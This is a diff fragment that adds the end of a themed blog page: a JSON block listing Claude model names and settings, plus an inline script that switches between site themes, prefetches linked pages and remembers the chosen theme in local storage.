+  <script type="application/json" class="session">{"models":[{"name":"Mythos 5.2","id":"claude-mythos-5-2","hint":"most capable"},{"name":"Fable 5.2","id":"claude-fable-5-2","hint":"most capable, with added safeguards"},{"name":"Opus 5.5","id":"claude-opus-5-5","hint":"for complex work"},{"name":"Sonnet 5.5","id":"claude-sonnet-5-5","hint":"best for everyday tasks"},{"name":"Haiku 5.5","id":"claude-haiku-5-5","hint":"fastest"}],"window":200000,"permissions":true,"posts":26}</script>
+</div>
+
+<script src="/claude/js/claude.js" defer></script>
+<script>(function(){var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="claude",root=T[here],p=location.pathname;var rel=p.indexOf(root)===0?p.slice(root.length):"";for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)rel=""}var links=document.querySelectorAll("a[data-switch]");function place(){if(scrollY<200)return"";var h=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]"),id="";for(var i=0;i<h.length;i++){if(h[i].getBoundingClientRect().top<160)id=h[i].id;else break}return id?"#"+encodeURIComponent(id):""}function url(a){return T[a.dataset.switch]+rel+"?theme="+a.dataset.switch}function warm(a){if(a.dataset.warm)return;a.dataset.warm=1;var l=document.createElement("link");l.rel="prefetch";l.href=url(a);document.head.appendChild(l)}links.forEach(function(a){a.href=url(a);a.addEventListener("pointerenter",function(){warm(a)});a.addEventListener("focus",function(){warm(a)});a.addEventListener("touchstart",function(){warm(a)},{passive:true});a.addEventListener("click",function(){try{localStorage.setItem("blog-theme",a.dataset.switch)}catch(e){}var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st);a.href=url(a)+place()})});document.querySelectorAll("details.tsw").forEach(function(d){d.addEventListener("toggle",function(){if(d.open)links.forEach(warm)});document.addEventListener("click",function(e){if(d.open&&!d.contains(e.target))d.open=false});document.addEventListener("keydown",function(e){if(e.key==="Escape")d.open=false})});})()</script></body>
+</html>
